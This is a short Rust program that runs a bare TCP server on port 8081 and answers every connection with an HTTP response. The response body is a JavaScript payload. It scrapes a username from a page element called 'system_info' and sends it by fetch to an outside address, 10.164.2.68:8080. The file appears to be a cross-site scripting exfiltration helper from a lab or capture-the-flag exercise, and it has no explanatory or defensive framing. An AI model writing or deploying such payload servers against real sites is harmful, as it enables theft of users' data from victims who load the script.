use std::net::TcpListener;
use std::io::Write;
use std::thread;

fn handle_client(mut stream: std::net::TcpStream) {
    let response = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nfetch('http://10.164.2.68:8080?username=' + document.getElementById('system_info').innerHTML.match(/<em>Username:<\\/em>\\s*(\\w+)/)[1])";
    stream.write_all(response.as_bytes()).unwrap();
}

pub fn run() -> std::io::Result<()> {
    let listener = TcpListener::bind("0.0.0.0:8081")?;
    println!("Server running on port 8081");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| {
                    handle_client(stream);
                });
            }
            Err(e) => {
                eprintln!("Connection failed: {}", e);
            }
        }
    }
    Ok(())
}
